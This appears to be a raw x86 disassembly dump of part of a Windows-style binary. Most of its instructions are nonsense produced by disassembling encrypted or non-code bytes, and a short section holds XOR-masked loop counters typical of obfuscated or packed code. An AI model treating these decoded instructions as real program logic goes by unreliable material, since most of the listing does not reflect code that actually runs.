  40ee43:	add    eax,0x177471fd
  40ee48:	arpl   ax,dx
  40ee4a:	test   al,0xb6
  40ee4c:	int    0x1e
  40ee4e:	cli    
  40ee4f:	(bad)  
  40ee50:	mov    ebp,0xbb00d5b8
  40ee55:	inc    eax
  40ee56:	add    ebx,edi
  40ee58:	or     esp,DWORD PTR [edx+0x1cebb5db]
  40ee5e:	adc    eax,0xe984a192
  40ee63:	out    dx,eax
  40ee64:	pop    edi
  40ee65:	sub    bh,BYTE PTR [esi+eiz*1]
  40ee68:	mov    ecx,0x4e312368
  40ee6d:	shr    edi,0xc6
  40ee70:	repz shr DWORD PTR [eax-0x77091fbe],0x17
  40ee78:	and    DWORD PTR [eax],0xffffffb9
  40ee7b:	cwde   
  40ee7c:	sar    eax,cl
  40ee7e:	cmp    DWORD PTR [ebx+0x5c],edx
  40ee81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee82:	xchg   ebp,eax
  40ee83:	cmp    cl,BYTE PTR [edi]
  40ee85:	mov    al,ds:0xd99c8e89
  40ee8a:	cmp    eax,DWORD PTR [eax]
  40ee8c:	in     eax,dx
  40ee8d:	push   esi
  40ee8e:	mov    al,ds:0xd675a950
  40ee93:	or     eax,0x5861622e
  40ee98:	repz mov ebx,0x5b805ede
  40ee9e:	adc    bl,BYTE PTR [edx-0x31cdf862]
  40eea4:	mov    eax,0x119fb35f
  40eea9:	cmp    bl,BYTE PTR [ebp-0x80]
  40eeac:	mov    esp,0xfa1230f9
  40eeb1:	add    ah,BYTE PTR [eax-0x16]
  40eeb4:	data16 scas al,BYTE PTR es:[edi]
  40eeb6:	pop    ds
  40eeb7:	xchg   DWORD PTR cs:[eax],eax
  40eeba:	sbb    dl,ch
  40eebc:	jge    0x40eeff
  40eebe:	xchg   edi,eax
  40eebf:	scas   al,BYTE PTR es:[edi]
  40eec0:	sbb    DWORD PTR [edx+0x6e7f00a4],ebp
  40eec6:	push   ebx
  40eec7:	call   0x5fb4:0x1cbf7ff9
  40eece:	sub    BYTE PTR [edi],0xf4
  40eed1:	mov    edi,0x49a3b8fb
  40eed6:	xchg   ebp,eax
  40eed7:	cld    
  40eed8:	in     eax,dx
  40eed9:	cmc    
  40eeda:	loop   0x40eefc
  40eedc:	mov    cl,0x23
  40eede:	sahf   
  40eedf:	into   
  40eee0:	stos   BYTE PTR es:[edi],al
  40eee1:	inc    esp
  40eee2:	retf   0xb86e
  40eee5:	pop    ecx
  40eee6:	xchg   BYTE PTR [edi-0x16bcf76f],bl
  40eeec:	in     al,0x11
  40eeee:	(bad)  
  40eeef:	int    0xb5
  40eef1:	sahf   
  40eef2:	inc    esp
  40eef3:	test   eax,esp
  40eef5:	cmp    esi,0xffffffde
  40eef8:	(bad)  
  40eef9:	adc    dh,BYTE PTR [esi-0x604424cf]
  40eeff:	pop    esp
  40ef00:	leave  
  40ef01:	mov    bh,0x33
  40ef03:	inc    esi
  40ef04:	jge    0x40ef4e
  40ef06:	mov    dh,dl
  40ef08:	test   eax,0x3a9ade4
  40ef0d:	out    dx,eax
  40ef0e:	jno    0x40ef2c
  40ef10:	sar    DWORD PTR [edi-0x72],0xa1
  40ef14:	adc    BYTE PTR [ebp-0x2b],cl
  40ef17:	scas   al,BYTE PTR es:[edi]
  40ef18:	xor    bl,bh
  40ef1a:	call   0xc59048e7
  40ef1f:	sub    ebx,ecx
  40ef21:	fcomip st,st(5)
  40ef23:	cmp    dl,BYTE PTR [edx+eiz*1]
  40ef26:	cmp    ebp,DWORD PTR cs:[eax]
  40ef29:	mov    ah,0x51
  40ef2b:	xchg   al,bl
  40ef2d:	push   edi
  40ef2e:	sahf   
  40ef2f:	and    DWORD PTR [ebp-0x78],esi
  40ef32:	or     BYTE PTR ds:0x8fa45c89,bh
  40ef38:	xor    al,0x4f
  40ef3a:	mov    eax,ds:0x225a9744
  40ef3f:	mov    ch,0x6c
  40ef41:	in     ax,dx
  40ef43:	dec    esi
  40ef44:	lock xlat BYTE PTR ds:[ebx]
  40ef46:	into   
  40ef47:	mov    ah,0x45
  40ef49:	or     esi,DWORD PTR [esi-0x69]
  40ef4c:	fadd   DWORD PTR [ebp-0xad1ea37]
  40ef52:	pop    edx
  40ef53:	jae    0x40ef10
  40ef55:	retf   0x9044
  40ef58:	xchg   esi,eax
  40ef59:	xor    DWORD PTR [eax+0x3f],ebp
  40ef5c:	dec    ecx
  40ef5d:	push   ecx
  40ef5e:	in     eax,0xe8
  40ef60:	xchg   esi,ebp
  40ef62:	dec    esp
  40ef63:	jecxz  0x40ef5e
  40ef65:	sub    al,0x70
  40ef67:	fst    DWORD PTR [esi+0xc]
  40ef6a:	pop    ds
  40ef6b:	leave  
  40ef6c:	lods   al,BYTE PTR ds:[esi]
  40ef6d:	pop    ebx
  40ef6e:	mov    dh,0x84
  40ef70:	(bad)  
  40ef72:	jp     0x40ef4a
  40ef74:	aas    
  40ef75:	and    DWORD PTR [ebp-0x6c06ecc8],eax
  40ef7b:	icebp  
  40ef7c:	call   0x2fc9:0xbf7abb18
  40ef83:	inc    ebp
  40ef84:	and    bl,BYTE PTR [edx-0x1c828172]
  40ef8a:	cmp    BYTE PTR [ecx],0x58
  40ef8d:	cmp    dh,BYTE PTR [edi]
  40ef8f:	enter  0x7592,0xcf
  40ef93:	inc    edx
  40ef94:	imul   eax,ebx,0xffffffb0
  40ef97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef98:	sar    DWORD PTR [eax-0x24af22fe],1
  40ef9e:	fidivr WORD PTR [esi+eax*4-0x31f4d47]
  40efa5:	or     DWORD PTR [edx+0x40cf9f18],edi
  40efab:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efad:	xor    edi,DWORD PTR [esi-0x63922053]
  40efb3:	fadd   st(7),st
  40efb6:	mov    edi,0xc7d2ded7
  40efbb:	aaa    
  40efbc:	mov    ds:0xa224acfc,eax
  40efc1:	repz sar ah,0x76
  40efc5:	jnp    0x40ef75
  40efc7:	into   
  40efc8:	scas   al,BYTE PTR es:[edi]
  40efc9:	push   esp
  40efca:	shl    ch,0xa3
  40efcd:	jbe    0x40efb2
  40efcf:	add    dh,dh
  40efd1:	loope  0x40f050
  40efd3:	sub    bl,BYTE PTR [esi-0x3a]
  40efd6:	out    0x7f,eax
  40efd8:	test   DWORD PTR ds:0x53957ccd,eax
  40efde:	repnz iret 
  40efe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe2:	ins    BYTE PTR es:[edi],dx
  40efe3:	push   0x20
  40efe5:	ins    BYTE PTR es:[edi],dx
  40efe6:	stc    
  40efe7:	adc    eax,0xd870ba2d
  40efec:	fsubp  st(7),st
  40efee:	cmp    al,0x86
  40eff0:	dec    eax
  40eff1:	stos   BYTE PTR es:[edi],al
  40eff2:	and    eax,0xe674c00
  40eff7:	les    ebp,FWORD PTR [ecx+ecx*2-0x65]
  40effb:	dec    ecx
  40effc:	or     al,0x83
  40effe:	loop   0x40efd4
  40f000:	jmp    0x467febbd
  40f005:	sbb    edx,DWORD PTR [esi-0x18618ff]
  40f00b:	dec    edi
  40f00c:	cmp    DWORD PTR [ebp+0x5c],edi
  40f00f:	xor    al,0xeb
  40f011:	movaps xmm5,xmm7
  40f014:	add    ebp,DWORD PTR [esi-0x37]
  40f017:	xor    cl,ch
  40f019:	push   ds
  40f01a:	rcr    ebp,1
  40f01c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f01d:	(bad)  
  40f01e:	stc    
  40f01f:	fild   DWORD PTR [eax+0x4d136234]
  40f025:	and    al,0x5f
  40f027:	mov    DWORD PTR ds:0x5e6118ce,esp
  40f02e:	pop    es
  40f02f:	lea    edi,[ecx+edx*4-0x5]
  40f033:	test   al,0x92
  40f035:	or     esi,DWORD PTR gs:[ebp+0x24b88e55]
  40f03c:	stos   BYTE PTR es:[edi],al
  40f03d:	js     0x40f00c
  40f03f:	clc    
  40f040:	popa   
  40f041:	lock in eax,0xa9
  40f044:	rol    DWORD PTR [edx],1
  40f046:	mov    cl,dl
  40f048:	dec    esp
  40f049:	mov    ch,BYTE PTR [esp+edi*2-0x5e2533a9]
  40f050:	jp     0x40eff1
  40f052:	leave  
  40f053:	shr    DWORD PTR [esi+eiz*1+0x538b66ff],1
  40f05a:	and    eax,0x32934aad
  40f05f:	out    0xcb,eax
  40f061:	jno    0x40f00d
  40f063:	dec    ecx
  40f064:	jb     0x40f0c9
  40f066:	out    0xbf,al
  40f068:	or     al,0x45
  40f06a:	jae    0x40f0e3
  40f06c:	daa    
  40f06d:	dec    edx
  40f06e:	sub    esp,esi
  40f070:	xor    DWORD PTR [eax],esi
  40f072:	and    ebx,DWORD PTR [esi]
  40f074:	leave  
  40f075:	aaa    
  40f076:	rcl    ch,0xe3
  40f079:	sub    eax,0x8381ebef
  40f07e:	xchg   BYTE PTR [ecx],bh
  40f080:	test   DWORD PTR [edi-0x60],esp
  40f083:	shr    DWORD PTR [esi+0x238d76e1],0x4b
  40f08a:	sti    
  40f08b:	shl    ebp,cl
  40f08d:	push   esi
  40f08e:	mov    BYTE PTR [edi],al
  40f090:	add    eax,0xb37a52e1
  40f095:	test   al,0x14
  40f097:	mov    al,0xfe
  40f099:	inc    ebx
  40f09a:	ins    DWORD PTR es:[edi],dx
  40f09b:	push   es
  40f09c:	or     ebx,DWORD PTR [ebp-0x7d197ad4]
  40f0a2:	ins    BYTE PTR es:[edi],dx
  40f0a3:	(bad)  
  40f0a4:	mov    ds:0x168b9146,eax
  40f0a9:	rol    dl,0xa
  40f0ac:	dec    eax
  40f0ad:	imul   ebp
  40f0af:	inc    ebx
  40f0b0:	jmp    0x9bc3f4b
  40f0b5:	jl     0x40f05c
  40f0b7:	daa    
  40f0b8:	aaa    
  40f0b9:	sbb    eax,0xfe9541d0
  40f0be:	dec    esi
  40f0bf:	aaa    
  40f0c0:	jbe    0x40f13e
  40f0c2:	and    DWORD PTR [ecx+0x6b1e991c],eax
  40f0c8:	jb     0x40f08d
  40f0ca:	sub    al,0x90
  40f0cc:	and    dh,BYTE PTR [ebx-0x75]
  40f0cf:	jns    0x40f0f5
  40f0d1:	add    DWORD PTR [edx],esi
  40f0d3:	fnstsw WORD PTR [esi+ebx*1-0x7ab1b2b2]
  40f0da:	(bad)  
  40f0db:	das    
  40f0dc:	push   cs
  40f0dd:	and    ah,BYTE PTR [edx]
  40f0df:	loop   0x40f130
  40f0e1:	or     al,0xfa
  40f0e3:	or     DWORD PTR [esi],0x233171d0
  40f0e9:	sbb    DWORD PTR ds:0xed27c6f1,ebx
  40f0ef:	aaa    
  40f0f0:	(bad)  
  40f0f1:	test   BYTE PTR [ecx+0x365271f],0xce
  40f0f8:	pop    esi
  40f0f9:	(bad)
  40f0fd:	push   edx
  40f0fe:	fwait
  40f0ff:	xchg   esi,eax
  40f100:	(bad)  
  40f101:	sbb    eax,0xdaaa800f
  40f107:	(bad)  
  40f109:	adc    ebp,DWORD PTR ds:0xdf642ee3
  40f10f:	je     0x40f0fd
  40f111:	fcom   st(0)
  40f113:	cmp    BYTE PTR [ebx+0x42],bh
  40f116:	and    ebp,DWORD PTR [esi+0x31ae2046]
  40f11c:	outs   dx,DWORD PTR ds:[esi]
  40f11d:	pop    ecx
  40f11e:	sub    bh,BYTE PTR [ebx+0x6c]
  40f121:	ret    0xce2c
  40f124:	and    BYTE PTR [edx-0x66],ah
  40f127:	mov    edx,DWORD PTR [ebx+0x571cf126]
  40f12d:	push   ss
  40f12e:	lds    ebp,FWORD PTR [eax+eiz*4]
  40f131:	das    
  40f132:	add    al,0xf1
  40f134:	jecxz  0x40f188
  40f136:	sub    ebp,edi
  40f138:	imul   DWORD PTR [ecx-0x47d8e82]
  40f13e:	mov    ebp,0x410c5f71
  40f143:	fdiv   QWORD PTR [esi-0x476599f0]
  40f149:	sbb    ch,bh
  40f14b:	loop   0x40f13e
  40f14d:	je     0x40f141
  40f14f:	mov    bl,BYTE PTR gs:[edx+0x19c8d980]
  40f156:	nop    DWORD PTR [edi]
  40f159:	mov    dh,0x37
  40f15b:	rcl    BYTE PTR [ebx+ebp*2+0x13],1
  40f15f:	sub    eax,0x17e512c0
  40f164:	add    al,0xbe
  40f166:	pushf  
  40f167:	stos   DWORD PTR es:[edi],eax
  40f168:	aas    
  40f169:	mov    BYTE PTR [ebx-0x1de53dc],ch
  40f16f:	pop    eax
  40f170:	(bad)  
  40f171:	and    BYTE PTR [eax],bl
  40f173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f174:	daa    
  40f175:	loop   0x40f1d0
  40f177:	xchg   edi,eax
  40f178:	test   DWORD PTR [eax-0x26],esi
  40f17b:	gs jg  0x40f175
  40f17e:	pop    ecx
  40f17f:	sub    al,0x35
  40f181:	xchg   DWORD PTR ds:0x85400c5e,ecx
  40f187:	(bad)  
  40f188:	aam    0x30
  40f18a:	xor    ah,bh
  40f18c:	cld    
  40f18d:	aam    0x77
  40f18f:	call   0x91974aaf
  40f194:	cmp    esp,esp
  40f196:	or     dl,ch
  40f198:	and    BYTE PTR [eax+eiz*8-0x247cff4c],ch
  40f19f:	mov    cl,0xd9
  40f1a1:	adc    ebx,DWORD PTR [edx+0xa06b9b2]
  40f1a7:	fs inc ebp
  40f1a9:	out    0x16,eax
  40f1ab:	in     eax,dx
  40f1ac:	pop    edx
  40f1ad:	cmp    DWORD PTR [edi-0x1c4b710e],edi
  40f1b3:	cld    
  40f1b4:	jb     0x40f1a6
  40f1b6:	push   edi
  40f1b7:	rcl    ebx,cl
  40f1b9:	dec    cl
  40f1bb:	(bad)  
  40f1bc:	imul   esi,DWORD PTR [eax],0x40e73b91
  40f1c2:	test   BYTE PTR [edx+0x72a33766],al
  40f1c8:	ss jb  0x40f211
  40f1cb:	ins    BYTE PTR es:[edi],dx
  40f1cc:	ror    DWORD PTR [eax],1
  40f1ce:	cwde   
  40f1cf:	inc    ebx
  40f1d0:	mov    BYTE PTR [ebp+0xa5505cd],ah
  40f1d6:	pop    es
  40f1d7:	mov    bh,ch
  40f1d9:	js     0x40f167
  40f1db:	mov    cl,0x2d
  40f1dd:	and    eax,0x3073db6c
  40f1e2:	daa    
  40f1e3:	mov    bh,al
  40f1e5:	jecxz  0x40f264
  40f1e7:	mov    edx,0xc50a305a
  40f1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1ed:	xchg   ecx,eax
  40f1ee:	xor    eax,0xbd57e19f
  40f1f3:	xor    eax,ecx
  40f1f5:	mov    ds:0xf6e846a3,eax
  40f1fa:	xchg   edi,eax
  40f1fb:	addr16 cmp esi,edi
  40f1fe:	retf   0xc7f9
  40f201:	jp     0x40f237
  40f203:	out    dx,al
  40f204:	lahf   
  40f205:	int    0x7c
  40f207:	mov    al,0xfc
  40f209:	aas    
  40f20a:	mov    ch,0xf3
  40f20c:	mov    ecx,fs
  40f20e:	xchg   esp,eax
  40f20f:	stc    
  40f210:	jae    0x40f222
  40f212:	pop    edx
  40f213:	pop    ecx
  40f214:	test   BYTE PTR [ebp+0x3d],bl
  40f217:	loope  0x40f254
  40f219:	pop    ecx
  40f21a:	lods   al,BYTE PTR ds:[esi]
  40f21b:	mov    eax,0x3a459f1c
  40f220:	outs   dx,DWORD PTR ds:[esi]
  40f221:	repnz das 
  40f223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f224:	ins    BYTE PTR es:[edi],dx
  40f225:	jo     0x40f26f
  40f227:	sub    DWORD PTR [ecx],eax
  40f229:	and    BYTE PTR [esp],bl
  40f22c:	mov    eax,ds:0xbde4b082
  40f231:	mov    ah,0x40
  40f233:	sub    al,0xae
  40f235:	cmp    DWORD PTR [ebx-0x9],esp
  40f238:	test   DWORD PTR [edx-0xe],esi
  40f23b:	cmc    
  40f23c:	xor    ch,ah
  40f23e:	push   ds
  40f23f:	ret    0xc402
  40f242:	faddp  st(4),st
  40f244:	add    BYTE PTR [edi],ah
  40f246:	arpl   sp,bx
  40f248:	jbe    0x40f1f8
  40f24a:	mov    al,0x59
  40f24c:	and    DWORD PTR [ebx],ebp
  40f24e:	cmp    BYTE PTR [ecx],0x51
  40f251:	aam    0xa
  40f253:	ds pop ebp
  40f255:	shr    BYTE PTR [edi*1-0x35d3bb80],1
  40f25c:	cwde   
  40f25d:	into   
  40f25e:	sti    
  40f25f:	cli    
  40f260:	mov    bl,0xe5
  40f262:	es scas al,BYTE PTR es:[edi]
  40f264:	mov    ah,0xd4
  40f266:	push   ecx
  40f267:	xchg   esi,eax
  40f268:	and    DWORD PTR [esi-0x1b],esp
  40f26b:	mov    esp,0x4a859a61
  40f270:	int3   
  40f271:	sbb    ebp,DWORD PTR [edi-0x2d]
  40f274:	test   eax,0xbc1211bb
  40f279:	jle    0x40f28d
  40f27b:	js     0x40f277
  40f27d:	ret    0xc9bb
  40f280:	imul   eax,DWORD PTR [edx],0x2fede7d
  40f286:	dec    eax
  40f287:	dec    eax
  40f288:	jp     0x40f295
  40f28a:	inc    DWORD PTR [esi+ecx*2-0x587e94af]
  40f291:	xchg   edi,eax
  40f292:	stos   DWORD PTR es:[edi],eax
  40f293:	sti    
  40f294:	inc    esp
  40f295:	shr    BYTE PTR [ebp+0x5b],0xec
  40f299:	or     eax,0x5be19c04
  40f29e:	or     BYTE PTR [ecx+0x68],al
  40f2a1:	cmp    eax,0x8aa85261
  40f2a6:	test   DWORD PTR [eax+esi*1+0x33],0xf1855d73
  40f2ae:	jbe    0x40f23e
  40f2b0:	arpl   WORD PTR [ebx],bx
  40f2b2:	mov    bh,0x3b
  40f2b4:	adc    BYTE PTR [eax-0x4d],al
  40f2b7:	int3   
  40f2b8:	(bad)  
  40f2b9:	push   ebp
  40f2ba:	add    BYTE PTR [esi],dl
  40f2bc:	or     BYTE PTR [ebx],ch
  40f2be:	inc    ebx
  40f2bf:	sbb    BYTE PTR [eax],cl
  40f2c1:	test   DWORD PTR [edi],edi
  40f2c3:	test   BYTE PTR [ebx],al
  40f2c5:	(bad)  
  40f2c6:	(bad)  [ebx+0x15]
  40f2c9:	sbb    bl,BYTE PTR [eax+0x31e0959d]
  40f2cf:	pop    esi
  40f2d0:	mov    DWORD PTR [ecx+ebx*4-0x55ca15c5],ebx
  40f2d7:	rcl    DWORD PTR [edx+0x8],0x2d
  40f2db:	push   esp
  40f2dc:	sbb    al,0xc5
  40f2de:	retf   0x9933
  40f2e1:	in     eax,0x6f
  40f2e3:	cmp    dl,BYTE PTR [eax+0x64576d8f]
  40f2e9:	inc    edx
  40f2ea:	or     eax,0x8cd63652
  40f2ef:	sbb    esp,edi
  40f2f1:	fcom   QWORD PTR fs:[eax+0x53]
  40f2f5:	jbe    0x40f2e0
  40f2f7:	push   ds
  40f2f8:	cmp    al,0x92
  40f2fa:	sub    BYTE PTR [edx+edi*4+0x7a],ah
  40f2fe:	jnp    0x40f2e9
  40f300:	or     edx,DWORD PTR [edx+0x76]
  40f303:	xchg   esi,eax
  40f304:	or     DWORD PTR [eax-0x80898b4],ebx
  40f30a:	inc    ebp
  40f30b:	push   esi
  40f30c:	sub    al,0x87
  40f30e:	repnz jmp 0x3c30:0x1814612b
  40f316:	or     edi,DWORD PTR [ebp-0x17]
  40f319:	xor    dh,al
  40f31b:	out    dx,al
  40f31c:	sub    al,0x85
  40f31e:	std    
  40f31f:	fiadd  DWORD PTR [esi+edx*1+0x69420030]
  40f326:	shl    bl,0xd3
  40f329:	into   
  40f32a:	cdq    
  40f32b:	stc    
  40f32c:	cwde   
  40f32d:	mov    al,0xe8
  40f32f:	xlat   BYTE PTR ds:[ebx]
  40f330:	push   ss
  40f331:	and    al,0x59
  40f333:	call   FWORD PTR [eax+eax*4]
  40f336:	dec    ebx
  40f337:	adc    edx,DWORD PTR ds:0xb38b1e1
  40f33d:	adc    ch,BYTE PTR cs:[edx+0x5185cea7]
  40f344:	aas    
  40f345:	out    0x70,eax
  40f347:	mov    bh,0x34
  40f349:	jmp    0x4e26:0x4192e6da
  40f350:	adc    dl,BYTE PTR [esi+0x2ad4b99b]
  40f356:	and    BYTE PTR [ebx-0x1ba1ff52],cl
  40f35c:	pop    esp
  40f35d:	test   eax,0x5e6e0f95
  40f362:	(bad)  
  40f363:	jno    0x40f3da
  40f365:	pop    ss
  40f366:	pop    es
  40f367:	sub    BYTE PTR [eax+0x15],ch
  40f36a:	cmp    esi,eax
  40f36c:	stos   BYTE PTR es:[edi],al
  40f36d:	mov    ebp,0x2a97d701
  40f372:	lock and al,BYTE PTR ds:0x35a187ac
  40f379:	sbb    DWORD PTR [ebx-0x1e],edi
  40f37c:	mov    ebx,0x8b550148
  40f381:	sbb    dh,BYTE PTR [ebx]
  40f383:	sti    
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0xc4b2fc7,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	outs   dx,DWORD PTR ds:[esi]
  40f484:	gs out 0x6f,al
  40f487:	jmp    0x1a9d8bf1
  40f48c:	sahf   
  40f48d:	clc    
  40f48e:	or     BYTE PTR [edx-0x67335e9e],ah
  40f494:	pop    ds
  40f495:	or     eax,DWORD PTR [edx+eiz*2]
  40f498:	loopne 0x40f464
  40f49a:	out    0x89,eax
  40f49c:	fld    DWORD PTR [eax]
  40f49e:	push   0x51
  40f4a0:	or     esp,DWORD PTR [ecx-0x79]
  40f4a3:	fsub   st,st(2)
  40f4a5:	xchg   edi,eax
  40f4a6:	pop    ebx
  40f4a7:	iret   
  40f4a8:	ins    BYTE PTR es:[edi],dx
  40f4a9:	push   esp
  40f4aa:	fs inc esi
  40f4ac:	adc    DWORD PTR [ebp-0x4],ebx
  40f4af:	push   ecx
  40f4b0:	xor    DWORD PTR [ecx-0x398fd954],edx
  40f4b6:	arpl   WORD PTR [edx],si
  40f4b8:	pop    edx
  40f4b9:	add    al,0x29
  40f4bb:	loopne 0x40f4e5
  40f4bd:	pop    ds
  40f4be:	mov    ebx,0xb1035d19
  40f4c3:	pop    eax
  40f4c4:	push   eax
  40f4c5:	js     0x40f4db
  40f4c7:	call   0xd3b15037
  40f4cc:	data16 aas 
  40f4ce:	sbb    edi,DWORD PTR [ebx+0x35]
  40f4d1:	repnz push ds
  40f4d3:	loopne 0x40f4f1
  40f4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d6:	add    ch,BYTE PTR [ecx]
  40f4d8:	push   ecx
  40f4d9:	lock cmp eax,0x631f70bc
  40f4df:	ficom  DWORD PTR [edx-0x26a3a608]
  40f4e5:	jmp    0x68e5:0x18ceb83b
  40f4ec:	push   0x712241ac
  40f4f1:	(bad)  
  40f4f2:	cmp    al,0x7a
  40f4f4:	mov    ch,0x7a
  40f4f6:	js     0x40f573
  40f4f8:	loope  0x40f4de
  40f4fa:	mov    dl,0x39
  40f4fc:	loopne 0x40f48b
  40f4fe:	retf   0xc829
  40f501:	test   eax,0x3dbcc9b
  40f506:	addr16 sti 
  40f508:	mov    ds:0xac632d2d,eax
  40f50d:	je     0x40f552
  40f50f:	push   edx
  40f510:	pop    ds
  40f511:	inc    ebx
  40f512:	in     al,0x47
  40f514:	sbb    dh,dh
  40f516:	stc    
  40f517:	pop    edx
  40f518:	mov    ch,0xc8
  40f51a:	jnp    0x40f552
  40f51c:	xor    DWORD PTR [esi+0x5b],eax
  40f51f:	jmp    0xd8664a75
  40f524:	out    0xe1,eax
  40f526:	es dec esi
  40f528:	pop    ss
  40f529:	pop    ebp
  40f52a:	pusha  
  40f52b:	xlat   BYTE PTR ds:[ebx]
  40f52c:	lea    esi,[edx-0x43]
  40f52f:	xchg   ebp,eax
  40f530:	jbe    0x40f50a
  40f532:	retf   0x6fb3
  40f535:	or     BYTE PTR [ecx+0x5e],cl
  40f538:	dec    esp
  40f539:	push   edi
  40f53a:	repz cmp BYTE PTR [esp+edx*4-0x26711a58],bl
  40f542:	and    bh,ah
  40f544:	clc    
  40f545:	scas   eax,DWORD PTR es:[edi]
  40f546:	in     al,0x86
  40f548:	sbb    BYTE PTR [esi+ecx*2-0x63],0xf5
  40f54d:	and    al,0x97
  40f54f:	sbb    DWORD PTR [ebp+0x5e],ecx
  40f552:	in     eax,0xbf
  40f554:	call   0x10a51df9
  40f559:	aam    0x8b
  40f55b:	pop    esp
  40f55c:	jbe    0x40f52f
  40f55e:	push   cs
  40f55f:	arpl   WORD PTR [ebx+0x3f018cfc],ax
  40f565:	push   cs
  40f566:	inc    esp
  40f567:	ins    DWORD PTR es:[edi],dx
  40f568:	add    dh,cl
  40f56a:	adc    ebp,DWORD PTR [eax]
  40f56c:	jg     0x40f5ea
  40f56e:	(bad)  
  40f56f:	cmc    
  40f570:	enter  0x402f,0xd5
  40f574:	ret    
  40f575:	lods   eax,DWORD PTR ds:[esi]
  40f576:	cmp    eax,0xc0cfa77c
  40f57b:	pusha  
  40f57c:	or     BYTE PTR [eax-0x72a397f8],dh
  40f582:	pushf  
  40f583:	out    0x29,eax
  40f585:	ja     0x40f56e
  40f587:	retf   0x41c
  40f58a:	xchg   esp,eax
  40f58b:	xchg   ecx,eax
  40f58c:	dec    eax
  40f58d:	pusha  
  40f58e:	dec    ebp
  40f58f:	out    0xe2,al
  40f591:	ret    0xafd7
  40f594:	pusha  
  40f595:	mov    cl,0x84
  40f597:	or     DWORD PTR [ebp+eiz*8+0x289dae97],eax
  40f59e:	or     bl,0x30
  40f5a1:	sub    edi,DWORD PTR [edx]
  40f5a3:	popa   
  40f5a4:	mov    dl,0xe0
  40f5a6:	sbb    eax,0x3b3b108c
  40f5ac:	adc    BYTE PTR [edx+0x49e24b14],cl
  40f5b2:	mov    bl,0x4e
  40f5b4:	sub    ecx,DWORD PTR [edi]
  40f5b6:	loopne 0x40f62e
  40f5b8:	aam    0xf
  40f5ba:	xor    ebx,ebp
  40f5bc:	test   eax,0x67c5c704
  40f5c1:	push   edi
  40f5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
